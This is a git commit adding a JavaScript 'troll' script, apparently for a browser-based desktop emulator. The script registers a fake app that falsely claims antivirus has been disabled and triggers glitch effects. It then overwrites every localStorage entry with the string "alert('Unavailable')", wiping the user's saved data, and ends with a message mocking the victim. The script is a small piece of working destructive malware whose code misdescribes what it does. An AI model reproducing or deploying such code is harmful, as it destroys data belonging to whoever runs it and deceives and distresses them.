2126a0604e9dfab4bbeca4a54b0edd85fe3b58d9
phsoftware-corp <heckervirusads+free@gmail.com>
2025-03-02 00:57:58 +0100

    Create trollboxplusplusplus.js

---
+++ trollboxplusplusplus.js
@@ -0,0 +1,25 @@
+le._apps["doctor"] = { name: "Doctor Shitburg", icon: "c/files/images/icons/troll.png", exec: function(){alert("Antivirus has been disabled.");} }
+desktop.refresh();
+$exe("corglitch");
+$exe("corglitch");
+$exe("corglitch");
+$exe("corglitch");
+$exe("corglitch");
+// Function to update localStorage with random data
+function updater() {
+    // Get all keys from localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        
+        // Generate random data for the current key
+        const data = "alert('Unavailable')"
+        
+        // Update the value in localStorage
+        localStorage.setItem(key, JSON.stringify(data)); // Use JSON.stringify to handle non-string values
+    }
+}
+
+// Call the function to update localStorage
+updater();
+$exe("trollbox");
+$alert("seek for help in tb lol!!! no one will help u");
